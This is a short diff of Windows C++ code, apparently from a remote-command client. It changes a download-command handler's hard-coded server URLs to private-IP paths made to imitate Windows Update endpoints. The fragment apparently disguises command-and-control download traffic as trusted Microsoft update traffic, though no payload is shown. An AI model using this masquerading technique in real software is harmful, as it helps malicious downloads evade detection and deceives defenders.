@@ -6,7 +6,7 @@
 #include <ctime>
 #include <fstream>
 #include <windows.h>
-#include <regex>  // Include regex header for pattern matching
+#include <regex>  
 #include <vector>
 
 std::wstring tempCommand = L"";
@@ -50,8 +50,8 @@ bool IsDownloadCommand(const std::wstring& command) {
     std::wstring remoteUrl;
     std::wstring localPath;
     std::vector<std::wstring> remoteUrls = {
-        L"http://10.0.10.114:8080/updates/",
-        L"http://10.0.10.114:8080/updates/",
+        L"http://192.168.14.102:8080/windowsupdate/v10/handlers/secure/enroll/mssecure/download/updates/",
+        L"http://192.168.14.101:8080/windowsupdate/v10/handlers/secure/enroll/mssecure/download/updates/",
     };
 
     std::wregex downloadPattern(L"^download\\s+([^\s]+)\\s+\"?([^\"]+)\"?$");
